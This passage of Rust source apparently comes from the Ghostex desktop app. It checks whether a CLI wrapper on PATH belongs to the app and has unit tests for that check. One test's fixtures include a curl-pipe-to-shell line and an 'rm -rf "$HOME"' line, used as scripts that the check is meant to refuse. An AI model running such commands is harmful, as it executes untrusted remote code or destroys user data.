    let managed_gxserver_dir = crate::shared_settings::ghostex_storage_paths().gxserver_data_dir();
    let is_managed_ghostex_cli = realpath
        .file_name()
        .map(|file_name| {
            file_name.eq_ignore_ascii_case("ghostex")
                || (cfg!(windows) && file_name.eq_ignore_ascii_case("ghostex.exe"))
                || (cfg!(unix) && file_name.eq_ignore_ascii_case("gxserver"))
        })
        .unwrap_or(false)
        && gpui_path_is_relative_to(realpath, &managed_gxserver_dir);
    is_managed_ghostex_cli
        || gpui_is_merged_bundle_cli_realpath(&normalized)
        || normalized.contains(&format!("/ghostex.app/contents/resources/cli/{command}"))
        || normalized.contains(&format!(
            "/ghostex.app/contents/resources/web/cli/{command}"
        ))
        || normalized.contains("/ghostex.app/contents/resources/cli/ghostex-cli.mjs")
        || (command == "ghostex" && normalized.contains("/ghostex.app/contents/macos/ghostex"))
}

/// CDXC:Cli 2026-10-23 WHY:
/// macOS and Linux ship `ghostex` as a link to gxserver (CDXC:Release 2026-10-23 in server/src/main.rs), so a PATH entry linking to a bundle's `CLI/ghostex`, the Homebrew cask's included, now resolves to `Contents/Resources/Web/gxserver/bin/gxserver`. Every realpath ownership check accepts that file as the CLI; otherwise startup would treat the cask's link as someone else's command, the failure behind GitHub issue #203. `normalized` is the lowercased path with `/` separators.
/// Since 2026-11-04 that file is the main executable of the package's GhostexServer.app (CDXC:RemotePairing in apps/desktop/scripts/package-macos-gxserver-bundles.sh), behind the package's `bin/gxserver` link.
fn gpui_is_merged_bundle_cli_realpath(normalized: &str) -> bool {
    normalized.ends_with("/ghostex.app/contents/resources/web/gxserver/bin/gxserver")
        || normalized.ends_with(
            "/ghostex.app/contents/resources/web/gxserver/ghostexserver.app/contents/macos/gxserver",
        )
}

/// The `/usr/bin/ghostex` script every Linux package ships, byte for byte as
/// `tooling/release-gpui/linux-stage.sh` writes it.
pub(crate) const GPUI_LINUX_PACKAGE_CLI_WRAPPER: &str =
    "#!/usr/bin/env bash\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\n";

/// CDXC:Cli 2026-10-26 WHY:
/// The deb, rpm and tarball, and the AUR `ghostex-bin` package that installs the tarball verbatim, put `ghostex` on PATH as `/usr/bin/ghostex`, an unmarked two-line script that execs `/opt/ghostex/gxserver/bin/ghostex`, with `/usr/bin/gx` linking to it. The ownership checks only knew Ghostex's own marked wrappers and app-bundle realpaths, so every skill install refused that script with "could not prove it belongs to Ghostex": the first-run wizard's Computer Use and browser skill steps always failed on Arch, and Settings worked only after Link CLI wrote a marked wrapper into a ~/.local/bin that comes earlier on PATH (GitHub issue #311). Only the exact packaged script counts, so an unrelated `ghostex` stays refused, and the package manager owns it, so it is kept like a Homebrew cask link and never rewritten.
/// SEE-ALSO: the `usr/bin/ghostex` heredoc in tooling/release-gpui/linux-stage.sh.
pub(crate) fn gpui_is_linux_package_cli_wrapper_file(path: &Path) -> bool {
    if !gpui_is_regular_file(path) {
        return false;
    }
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return false;
    };
    if metadata.len() > 4 * 1024 {
        return false;
    }
    fs::read_to_string(path)
        .map(|content| content.trim_end() == GPUI_LINUX_PACKAGE_CLI_WRAPPER.trim_end())
        .unwrap_or(false)
}

pub(crate) fn gpui_is_marked_ghostex_wrapper_file(path: &Path) -> bool {
    if !gpui_is_regular_file(path) {
        return false;
    }
    let Ok(metadata) = fs::symlink_metadata(path) else {
        return false;
    };
    if metadata.len() > 128 * 1024 {
        return false;
    }
    fs::read_to_string(path)
        .map(|content| gpui_marked_ghostex_wrapper_content(&content))
        .unwrap_or(false)
}

pub(crate) fn gpui_is_regular_file(path: &Path) -> bool {
    fs::symlink_metadata(path)
        .map(|metadata| metadata.file_type().is_file())
        .unwrap_or(false)
}

pub(crate) fn gpui_path_exists_or_is_symlink(path: &Path) -> bool {
    fs::symlink_metadata(path).is_ok()
}

pub(crate) fn gpui_is_broken_symlink(path: &Path) -> bool {
    fs::symlink_metadata(path)
        .map(|metadata| metadata.file_type().is_symlink() && !path.exists())
        .unwrap_or(false)
}

pub(crate) fn gpui_realpath_or_self(path: &Path) -> PathBuf {
    fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}

pub(crate) fn gpui_write_executable_wrapper(path: &Path, content: &str) -> std::io::Result<()> {
    // Stage beside the target and rename over it: the rename swaps out an
    // existing wrapper, an app-owned symlink, or a broken link in one step
    // without ever following the old link (a plain write through a symlink
    // into the app bundle would clobber the bundled binary).
    let parent = path.parent().ok_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "wrapper path has no parent directory",
        )
    })?;
    let file_name = path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("ghostex");
    let staging_path = parent.join(format!(
        ".{file_name}.ghostex-gpui-{}-{}",
        std::process::id(),
        system_time_epoch_millis_string(SystemTime::now())
    ));
    let write_result = fs::write(&staging_path, content.as_bytes())
        .and_then(|_| gpui_set_executable_permissions(&staging_path))
        .and_then(|_| fs::rename(&staging_path, path));
    if write_result.is_err() {
        let _ = fs::remove_file(&staging_path);
    }
    write_result
}

pub(crate) fn gpui_set_executable_permissions(path: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        fs::set_permissions(path, fs::Permissions::from_mode(0o755))
    }
    #[cfg(not(unix))]
    {
        let _ = path;
        Ok(())
    }
}

pub(crate) fn gpui_clear_macos_execution_policy_xattrs(path: &Path) {
    /*
    CDXC:Cli 2026-06-24-12:56:
    Repaired public CLI wrappers may inherit macOS execution-policy xattrs from a previous install location. Clear only the two known assessment attributes after wrapper writes/replacements, suppress command output, and keep repair success independent from xattr removal failures.
    */
    #[cfg(target_os = "macos")]
    {
        for attribute in ["com.apple.provenance", "com.apple.quarantine"] {
            let _ = std::process::Command::new("/usr/bin/xattr")
                .arg("-d")
                .arg(attribute)
                .arg(path)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        }
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _ = path;
    }
}

pub(crate) fn gpui_install_bundled_ghostex_skill_action(
    action: GpuiGhostexCliSettingsAction,
    args: &[&str],
    display_name: &str,
) -> GpuiGhostexCliActionResult {
    match gpui_install_bundled_ghostex_skill(args, display_name) {
        Ok(message) => GpuiGhostexCliActionResult::success(action, message),
        Err(message) => GpuiGhostexCliActionResult::failure(action, message),
    }
}

pub(crate) fn gpui_install_bundled_ghostex_skill(
    args: &[&str],
    display_name: &str,
) -> Result<String, String> {
    /*
    CDXC:AgentSkills 2026-06-24-12:56:
    GPUI Settings installs bundled Ghostex skills through the platform's owned CLI and only the known `ghostex <namespace> install-skill` argv. Command text never comes from React, child stdout/stderr are suppressed, failures are reported generically, and status is refreshed from disk afterward.

    CDXC:AgentSkills 2026-06-24-13:08:
    Executing a PATH `ghostex` command from Settings requires strict Ghostex ownership evidence: a repair marker plus `ghostex-cli.mjs`, or an app-owned realpath recognized by the CLI repair ownership helper. Broad read-only status strings are not sufficient for process execution.
    */
    #[cfg(windows)]
    let (ghostex_path, platform_args) =
        crate::windows_terminal_backend::ghostex_cli_invocation(args)?;
    #[cfg(windows)]
    let platform_args = platform_args.iter().map(String::as_str).collect::<Vec<_>>();
    #[cfg(windows)]
    let args = platform_args.as_slice();
    #[cfg(not(windows))]
    let Some(ghostex_path) = gpui_which_command("ghostex") else {
        return Err(
            "Ghostex CLI was not found on PATH. Repair the Ghostex CLI before installing bundled skills."
                .to_string(),
        );
    };
    #[cfg(not(windows))]
    if !gpui_is_probably_ghostex_command(&ghostex_path, "ghostex") {
        return Err(
            "A ghostex command exists on PATH, but GPUI could not prove it belongs to Ghostex. Repair the Ghostex CLI before installing bundled skills."
                .to_string(),
        );
    }
    match gpui_run_command_with_timeout(&ghostex_path, args, Duration::from_secs(120)) {
        Ok(true) => Ok(format!("{display_name} installed.")),
        Ok(false) => Err(format!(
            "{display_name} install failed. Current integration status was refreshed."
        )),
        Err(_) => Err(format!(
            "{display_name} install could not be started. Current integration status was refreshed."
        )),
    }
}

#[cfg(all(test, unix))]
mod linux_package_cli_tests {
    use super::*;

    fn scratch_dir(name: &str) -> PathBuf {
        let dir = env::temp_dir().join(format!(
            "ghostex-cli-ownership-{name}-{}-{}",
            std::process::id(),
            system_time_epoch_millis_string(SystemTime::now())
        ));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("usr/bin")).unwrap();
        fs::create_dir_all(dir.join("home/.local/bin")).unwrap();
        fs::create_dir_all(dir.join("opt/ghostex/gxserver/bin")).unwrap();
        dir
    }

    fn write_executable(path: &Path, content: &str) {
        fs::write(path, content).unwrap();
        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[test]
    fn tool_managed_folders_are_never_install_targets() {
        let home = PathBuf::from("/home/me");
        for managed in [
            "/home/me/.local/share/mise/shims",
            "/home/me/.asdf/shims",
            "/home/me/.pyenv/shims",
            "/home/me/.rbenv/shims",
            "/home/me/.nodenv/shims",
            "/home/me/.cargo/bin",
            "/home/me/.bun/bin",
            "/home/me/.volta/bin",
            "/home/me/.nix-profile/bin",
            "/nix/var/nix/profiles/default/bin",
            "/run/current-system/sw/bin",
            "/home/linuxbrew/.linuxbrew/bin",
            "/home/me/.linuxbrew/bin",
            "/snap/bin",
            "/home/me/.local/state/ghostex/session-bin",
        ] {
            assert!(
                gpui_is_tool_managed_bin_dir(Path::new(managed), &home),
                "{managed}"
            );
        }
        for plain in [
            "/home/me/.local/bin",
            "/usr/local/bin",
            "/usr/bin",
            "/opt/homebrew/bin",
            "/home/me/bin",
        ] {
            assert!(
                !gpui_is_tool_managed_bin_dir(Path::new(plain), &home),
                "{plain}"
            );
        }
    }

    #[test]
    fn linux_prefers_local_bin_and_skips_tool_folders() {
        let root = scratch_dir("install-order");
        let home = root.join("home");
        let mise = home.join(".local/share/mise/shims");
        let cargo = home.join(".cargo/bin");
        let usr_local = root.join("usr/local/bin");
        let user_bin = home.join(".local/bin");
        let cli_dir = root.join("opt/ghostex/gxserver/bin");
        let path_entries = vec![mise.clone(), cargo.clone(), usr_local.clone()];
        let position = |dirs: &[PathBuf], dir: &Path| dirs.iter().position(|entry| entry == dir);

        let linux = gpui_cli_install_dirs_for(&path_entries, &[], &cli_dir, &home, true);
        assert_eq!(position(&linux, &mise), None);
        assert_eq!(position(&linux, &cargo), None);
        assert!(
            position(&linux, &user_bin).unwrap() < position(&linux, &usr_local).unwrap(),
            "{linux:?}"
        );

        // macOS keeps PATH order (Homebrew's bin first) and only drops tool folders.
        let mac =
            gpui_cli_install_dirs_for(&path_entries, &[user_bin.clone()], &cli_dir, &home, false);
        assert_eq!(position(&mac, &mise), None);
        assert!(position(&mac, &usr_local).unwrap() < position(&mac, &user_bin).unwrap());
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn the_path_fix_matches_the_users_shell() {
        let export = "export PATH=\"$HOME/.local/bin:$PATH\"";
        let zsh = gpui_cli_path_fix(Some("/usr/bin/zsh"));
        assert_eq!(
            (zsh.command.as_str(), zsh.place.as_str()),
            (export, "Add this line to ~/.zshrc")
        );
        let bash = gpui_cli_path_fix(Some("/bin/bash"));
        assert_eq!(bash.place, "Add this line to ~/.bashrc");
        let fish = gpui_cli_path_fix(Some("/usr/bin/fish"));
        assert_eq!(fish.command, "fish_add_path $HOME/.local/bin");
        for unknown in [None, Some("/bin/dash"), Some("")] {
            let fix = gpui_cli_path_fix(unknown);
            assert_eq!(
                (fix.command.as_str(), fix.place.as_str()),
                (export, "Add this line to ~/.profile")
            );
        }
    }

    #[test]
    fn local_bin_launcher_off_path_gets_a_path_hint() {
        let root = scratch_dir("path-hint");
        let home = root.join("home");
        let user_bin = home.join(".local/bin");
        assert_eq!(
            gpui_cli_user_bin_path_hint(&user_bin, &[root.join("usr/bin")], &home),
            None,
            "no launcher in ~/.local/bin, nothing to say"
        );
        write_executable(&user_bin.join("ghostex"), "#!/bin/sh\n");
        let hint = gpui_cli_user_bin_path_hint(&user_bin, &[root.join("usr/bin")], &home)
            .expect("off PATH");
        assert!(
            hint.starts_with("~/.local/bin is not on your PATH"),
            "{hint}"
        );
        assert!(hint.contains("$HOME/.local/bin"), "{hint}");
        assert_eq!(
            gpui_cli_user_bin_path_hint(&user_bin, &[user_bin.clone()], &home),
            None,
            "on PATH already"
        );
        let _ = fs::remove_dir_all(&root);
    }

    /// The AUR `ghostex-bin` layout: the tarball's /usr/bin/ghostex script and its gx link.
    fn aur_layout(name: &str) -> (PathBuf, PathBuf, PathBuf) {
        let root = scratch_dir(name);
        let cli_dir = root.join("opt/ghostex/gxserver/bin");
        write_executable(&cli_dir.join("ghostex"), "#!/bin/sh\n");
        let ghostex = root.join("usr/bin/ghostex");
        write_executable(&ghostex, GPUI_LINUX_PACKAGE_CLI_WRAPPER);
        std::os::unix::fs::symlink("ghostex", root.join("usr/bin/gx")).unwrap();
        (root, cli_dir, ghostex)
    }

    #[test]
    fn aur_usr_bin_script_and_gx_link_belong_to_ghostex() {
        let (root, cli_dir, ghostex) = aur_layout("aur");
        let gx = root.join("usr/bin/gx");
        let cli_binary = cli_dir.join("ghostex");

        assert!(gpui_is_probably_ghostex_command(&ghostex, "ghostex"));
        assert!(gpui_is_probably_ghostex_command(&gx, "gx"));
        assert!(gpui_is_ghostex_owned_command_path(
            "ghostex", &ghostex, &cli_dir
        ));
        assert!(gpui_is_ghostex_owned_command_path("gx", &gx, &cli_dir));
        assert_eq!(
            gpui_cli_entry_state(&ghostex),
            GpuiCliEntryState::LinuxPackageWrapper
        );
        assert_eq!(
            gpui_package_managed_cli("ghostex", &ghostex, &cli_binary),
            GpuiPackageManagedCli::Keep
        );
        assert_eq!(
            gpui_package_managed_cli("gx", &gx, &cli_binary),
            GpuiPackageManagedCli::Keep
        );
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn usr_bin_symlink_into_a_packaged_script_belongs_to_ghostex() {
        let root = scratch_dir("symlink");
        let packaged = root.join("opt/ghostex/ghostex-wrapper");
        write_executable(&packaged, GPUI_LINUX_PACKAGE_CLI_WRAPPER);
        let ghostex = root.join("usr/bin/ghostex");
        std::os::unix::fs::symlink(&packaged, &ghostex).unwrap();

        assert!(gpui_is_probably_ghostex_command(&ghostex, "ghostex"));
        assert_eq!(
            gpui_package_managed_cli("ghostex", &ghostex, &root.join("cli/ghostex")),
            GpuiPackageManagedCli::Keep
        );
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn link_cli_keeps_the_packaged_script_and_writes_nothing() {
        let (root, cli_dir, ghostex) = aur_layout("repair");
        let user_bin = root.join("home/.local/bin");
        let install_dirs = vec![root.join("usr/bin"), user_bin.clone()];

        let result = gpui_install_ghostex_cli_command(
            "ghostex",
            &cli_dir.join("ghostex"),
            &cli_dir,
            &install_dirs,
        );
        assert_eq!(result, GpuiCliCommandInstallResult::Current);
        assert_eq!(
            fs::read_to_string(&ghostex).unwrap(),
            GPUI_LINUX_PACKAGE_CLI_WRAPPER
        );
        assert!(!gpui_path_exists_or_is_symlink(&user_bin.join("ghostex")));
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn unrelated_ghostex_commands_are_still_refused() {
        let root = scratch_dir("unrelated");
        let cli_dir = root.join("opt/ghostex/gxserver/bin");
        write_executable(&cli_dir.join("ghostex"), "#!/bin/sh\n");
        let unrelated_scripts = [
            "#!/bin/sh\necho 'some other ghostex'\n",
            // The packaged exec line with anything extra is not the packaged script.
            "#!/usr/bin/env bash\ncurl -fsSL https://example.invalid | sh\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\n",
            "#!/usr/bin/env bash\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\nrm -rf \"$HOME\"\n",
            "#!/usr/bin/env bash\nexec /usr/local/ghostex/ghostex \"$@\"\n",
        ];
        for (index, content) in unrelated_scripts.iter().enumerate() {
            let ghostex = root.join("usr/bin/ghostex");
            write_executable(&ghostex, content);
            assert!(
                !gpui_is_probably_ghostex_command(&ghostex, "ghostex"),
                "script {index} was accepted"
            );
            assert!(!gpui_is_ghostex_owned_command_path(
                "ghostex", &ghostex, &cli_dir
            ));
            assert_eq!(gpui_cli_entry_state(&ghostex), GpuiCliEntryState::OtherFile);
            assert_eq!(
                gpui_package_managed_cli("ghostex", &ghostex, &cli_dir.join("ghostex")),
                GpuiPackageManagedCli::NotManaged
            );
            assert_eq!(
                gpui_install_ghostex_cli_command(
                    "ghostex",
                    &cli_dir.join("ghostex"),
                    &cli_dir,
                    &[root.join("usr/bin"), root.join("home/.local/bin")],
                ),
                GpuiCliCommandInstallResult::Blocked {
                    existing_path: ghostex.clone()
                }
            );
        }

        // A symlink into someone else's file is refused too.
        let other = root.join("opt/other-ghostex");
        write_executable(&other, "#!/bin/sh\necho other\n");
        let link = root.join("usr/bin/gx");
        std::os::unix::fs::symlink(&other, &link).unwrap();
        assert!(!gpui_is_probably_ghostex_command(&link, "gx"));
        assert_eq!(
            gpui_package_managed_cli("gx", &link, &cli_dir.join("ghostex")),
            GpuiPackageManagedCli::NotManaged
        );
        let _ = fs::remove_dir_all(root);
    }

    /// A Homebrew cask link to `CLI/ghostex` resolves into the package's GhostexServer.app since
    /// gxserver moved into it, and still counts as Ghostex's own CLI (GitHub #203).
    #[test]
    fn the_cli_resolved_into_the_gxserver_bundle_is_the_apps_own() {
        let web = "/Applications/Ghostex.app/Contents/Resources/Web/gxserver";
        for realpath in [
            format!("{web}/bin/gxserver"),
            format!("{web}/GhostexServer.app/Contents/MacOS/gxserver"),
        ] {
            assert!(gpui_is_package_cli_link_target(
                "ghostex",
                Path::new(&realpath)
            ));
            assert!(gpui_is_ghostex_app_owned_command_realpath(
                "ghostex",
                Path::new(&realpath)
            ));
        }
        assert!(!gpui_is_package_cli_link_target(
            "ghostex",
            Path::new(
                "/Applications/Other.app/Contents/Resources/Web/gxserver/GhostexServer.app/Contents/MacOS/gxserver"
            )
        ));
    }
}
